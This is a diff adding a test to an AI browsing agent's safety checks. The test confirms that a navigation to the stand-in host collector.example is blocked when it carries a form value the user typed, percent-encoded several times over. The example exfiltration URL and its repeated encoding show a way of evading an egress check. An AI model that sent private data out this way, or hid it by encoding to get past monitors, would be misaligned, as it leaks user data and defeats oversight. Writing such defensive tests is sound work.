@@ -372,6 +372,34 @@ describe("Agent navigation actions", () => {
     })
   })
 
+  it("blocks a typed value the model encoded to an arbitrary depth", async () => {
+    const decision = await decide(
+      navigate(
+        "https://collector.example/?d=account%25252520number%25252520555%2525252F12345"
+      ),
+      observation({
+        elements: [
+          {
+            ref: "e4",
+            frameId: 0,
+            tag: "input",
+            type: "text",
+            value: "account number 555/12345",
+            visible: true,
+            enabled: true,
+            editable: true,
+            sensitive: false
+          }
+        ]
+      })
+    )
+    expect(decision).toEqual({
+      type: "blocked",
+      risk: "critical",
+      reason: "private_data_egress"
+    })
+  })
+
   it("blocks a typed value the model encoded into a path segment", async () => {
     const decision = await decide(
       navigate("https://collector.example/account%20number%2055512345"),
